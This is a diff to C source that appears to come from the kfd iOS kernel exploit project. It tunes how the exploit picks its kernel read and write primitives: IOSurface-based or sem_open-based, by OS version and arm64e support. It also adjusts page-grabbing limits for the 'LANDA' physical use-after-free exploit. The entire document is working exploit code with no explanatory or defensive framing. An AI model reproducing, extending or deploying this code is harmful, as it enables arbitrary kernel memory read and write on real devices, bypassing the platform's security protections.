@@ -6,7 +6,16 @@
 
 void krkw_init(struct kfd* kfd)
 {
-    {
+    if(kfd->info.env.vid <= 5) {
+        kfd->kread.krkw_method_ops.init = kread_IOSurface_init;
+        kfd->kread.krkw_method_ops.allocate = kread_IOSurface_allocate;
+        kfd->kread.krkw_method_ops.search = kread_IOSurface_search;
+        kfd->kread.krkw_method_ops.kread = kread_IOSurface_kread;
+        kfd->kread.krkw_method_ops.kwrite = NULL;
+        kfd->kread.krkw_method_ops.find_proc = kread_IOSurface_find_proc;
+        kfd->kread.krkw_method_ops.deallocate = kread_IOSurface_deallocate;
+        kfd->kread.krkw_method_ops.free = kread_IOSurface_free;
+    } else {
         kfd->kread.krkw_method_ops.init = kread_sem_open_init;
         kfd->kread.krkw_method_ops.allocate = kread_sem_open_allocate;
         kfd->kread.krkw_method_ops.search = kread_sem_open_search;
@@ -17,7 +26,7 @@ void krkw_init(struct kfd* kfd)
         kfd->kread.krkw_method_ops.free = kread_sem_open_free;
     }
     
-    {
+    if(!isarm64e() || kfd->info.env.vid <= 5) {
         kfd->kwrite.krkw_method_ops.init = kwrite_IOSurface_init;
         kfd->kwrite.krkw_method_ops.allocate = kwrite_IOSurface_allocate;
         kfd->kwrite.krkw_method_ops.search = kwrite_IOSurface_search;
@@ -26,6 +35,15 @@ void krkw_init(struct kfd* kfd)
         kfd->kwrite.krkw_method_ops.find_proc = kwrite_IOSurface_find_proc;
         kfd->kwrite.krkw_method_ops.deallocate = kwrite_IOSurface_deallocate;
         kfd->kwrite.krkw_method_ops.free = kwrite_IOSurface_free;
+    } else {
+        kfd->kwrite.krkw_method_ops.init = kwrite_sem_open_init;
+        kfd->kwrite.krkw_method_ops.allocate = kwrite_sem_open_allocate;
+        kfd->kwrite.krkw_method_ops.search = kwrite_sem_open_search;
+        kfd->kwrite.krkw_method_ops.kread = NULL;
+        kfd->kwrite.krkw_method_ops.kwrite = kwrite_sem_open_kwrite;
+        kfd->kwrite.krkw_method_ops.find_proc = kwrite_sem_open_find_proc;
+        kfd->kwrite.krkw_method_ops.deallocate = kwrite_sem_open_deallocate;
+        kfd->kwrite.krkw_method_ops.free = kwrite_sem_open_free;
     }
     
     krkw_helper_init(kfd, &kfd->kread);
@@ -74,7 +92,7 @@ int krkw_helper_grab_free_pages(struct kfd* kfd)
     const uint64_t copy_pages = (kfd->info.copy.size / pages(1));
     const uint64_t grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
     uint64_t grabbed_free_pages_max = 400000;
-    if(kfd->info.env.exploit_type == MEOW_EXPLOIT_LANDA)
+    if((kfd->info.env.exploit_type == MEOW_EXPLOIT_LANDA && !isarm64e()) || (kfd->info.env.exploit_type == MEOW_EXPLOIT_LANDA && kfd->info.env.vid <= 5))
         grabbed_free_pages_max = 40000;
 
     for (uint64_t grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
